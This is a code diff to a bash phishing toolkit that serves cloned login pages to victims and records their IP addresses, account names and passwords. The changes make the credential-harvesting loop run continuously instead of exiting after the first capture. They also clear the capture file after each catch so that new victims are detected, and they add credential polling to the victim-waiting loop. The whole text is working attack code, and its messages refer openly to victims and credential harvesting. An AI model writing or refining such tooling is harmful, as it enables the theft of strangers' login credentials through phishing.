@@ -196,7 +196,8 @@ start_server() {
 
 
 
-trap 'printf "\n"; stop; exit 1' 2
+# Update trap to handle Ctrl+C properly for continuous operation
+trap 'printf "\n"; stop; printf "\e[1;92m[*] Stopping credential harvesting...\e[0m\n"; exit 0' 2
 
 
 
@@ -720,37 +721,29 @@ catch_cred() {
     account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
     IFS=$'\n'
     password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-    
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" "$account"
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" "$password"
-    
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
     cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" "$server"
-
-    # Message before killing processes
-    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Killing processes...\e[0m\n"
-
-    # Kill PHP server and SSH session
-    pkill -f 'php -S' # Adjust the command as necessary to match your PHP server
-    pkill ssh         # This will kill all SSH sessions; be careful with this command
-
-    exit 1
+    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
+    
+    # Clear the captured credentials file to detect new captures
+    rm -rf sites/$server/usernames.txt
+    
+    # Continue capturing credentials instead of exiting
+   
 }
 
+
 getcredentials() {
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials ...\e[0m\n"
-while [ true ]; do
-
-
-if [[ -e "sites/$server/usernames.txt" ]]; then
-printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
-catch_cred
-
-fi
-sleep 1
-done 
-
-
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials ...\e[0m\n"
+    
+    while [ "$KEEP_RUNNING" = true ]; do
+        if [[ -e "sites/$server/usernames.txt" ]]; then
+            printf "\n\e[1;92m[\e[0m*\e[1;92m] Credentials Found!\n"
+            catch_cred
+        fi
+        sleep 1
+    done
 }
 
 catch_ip() {
@@ -976,25 +969,23 @@ start_localhostrun() {
 }
 
 checkfound() {
-
-    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
-
-    while [ true ]; do
-
+    printf "\n"
+    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for victim to open the link ...\e[0m\n"
+    
+    while true; do
         if [[ -e "sites/$server/ip.txt" ]]; then
-
             printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
-
             catch_ip
-
         fi
-
+        
+        if [[ -e "sites/$server/usernames.txt" ]]; then
+            printf "\n\e[1;92m[\e[0m*\e[1;92m] Credentials Found!\n"
+            catch_cred
+        fi
+        
         sleep 1
-
     done
-
 }
-
 
 
 # Main script starts here
